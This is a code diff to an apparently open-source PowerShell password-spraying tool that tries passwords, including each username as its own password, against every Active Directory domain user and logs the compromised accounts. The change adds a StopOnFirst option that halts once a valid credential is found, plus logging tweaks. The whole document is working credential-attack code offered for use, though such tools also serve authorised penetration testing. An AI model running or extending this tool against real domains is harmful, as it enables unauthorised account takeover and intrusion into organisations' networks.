@@ -94,6 +94,9 @@ function Invoke-DomainPasswordSprayNG {
     .PARAMETER ContinueOnSuccess
         Continue testing a user even after finding valid credentials.
 
+    .PARAMETER StopOnFirst
+        Stop testing after finding valid credentials.
+
     .EXAMPLE
         Invoke-DomainPasswordSprayNG -Password "Winter2023!"
         Tests all domain users with the specified password.
@@ -120,7 +123,7 @@ function Invoke-DomainPasswordSprayNG {
         Author: agnorance
 
     .LINK
-        https://github.com/agnorance/fishing/blob/main/scripts/active-directory/DomainPasswordSprayNG.ps1
+        https://github.com/agnorance/fishing/blob/main/scripts/active-directory/DomainPasswordSprayNG/DomainPasswordSprayNG.ps1
     #>
 
     [CmdletBinding()]
@@ -144,7 +147,8 @@ function Invoke-DomainPasswordSprayNG {
         [Parameter(Position = 14, Mandatory = $false)][switch]$LogToFile,
         [Parameter(Position = 15, Mandatory = $false)][string]$LogFilePath = "spray_log.txt",
         [Parameter(Position = 16, Mandatory = $false)][int]$StatusUpdateInterval = 10,
-        [Parameter(Position = 17, Mandatory = $false)][switch]$ContinueOnSuccess
+        [Parameter(Position = 17, Mandatory = $false)][switch]$ContinueOnSuccess,
+        [Parameter(Position = 18, Mandatory = $false)][switch]$StopOnFirst
     )
 
     # Initialize logger
@@ -158,6 +162,7 @@ function Invoke-DomainPasswordSprayNG {
     }
 
     # Connect to domain
+    $logger.WriteLog("", "INFO")  # Add blank line
     $logger.WriteLog("Testing domain connection", "INFO")
     $domainConnection = Connect-DomainContext -Domain $Domain -Logger $logger
     if (-not $domainConnection) {
@@ -265,6 +270,12 @@ function Invoke-DomainPasswordSprayNG {
             
             Invoke-SprayAttempt -CurrentDomain $CurrentDomain -User $User -Password $User `
                                -Logger $logger -OutFile $OutFile
+
+            if ($StopOnFirst -and $logger.SuccessfulUsers.Count -gt 0) {
+            $logger.WriteLog("", "INFO")  # Add blank line
+            $logger.WriteLog("Valid credential found. Stopping as requested.", "SUCCESS")
+            break
+            }
             
             # Status updates
             $currentTime = Get-Date
@@ -326,6 +337,12 @@ function Invoke-DomainPasswordSprayNG {
                 # Perform the spray attempt
                 Invoke-SprayAttempt -CurrentDomain $CurrentDomain -User $User -Password $CurrentPassword `
                                 -Logger $logger -OutFile $OutFile
+
+                # Check if we found a valid credential and should stop
+                if ($StopOnFirst -and $logger.SuccessfulUsers.Count -gt 0) {
+                    $logger.WriteLog("Valid credential found. Stopping as requested.", "SUCCESS")
+                    return
+                }
                 
                 # Add a minimal sleep to prevent overwhelming the DC (DO NOT REMOVE!)
                 Start-Sleep -Milliseconds 10
@@ -838,7 +855,7 @@ class SprayLogger {
         $endTime = Get-Date
         $duration = $endTime - $this.StartTime
 
-        $this.WriteLog("", "INFO")  # Add blank line before summary
+        $this.WriteLog("", "INFO")  # Add blank line
         $this.WriteLog("=== Spray Summary ===", "INFO")
         
         $summaryLines = @(
@@ -855,6 +872,7 @@ class SprayLogger {
         }
 
         if ($this.SuccessfulUsers.Count -gt 0) {
+            $this.WriteLog("", "INFO")  # Add blank line
             $this.WriteLog("=== Compromised Accounts ===", "SUCCESS")
             foreach ($user in $this.SuccessfulUsers.Keys) {
                 $this.WriteLog("$($user.PadRight(30)) : $($this.SuccessfulUsers[$user])", "SUCCESS")
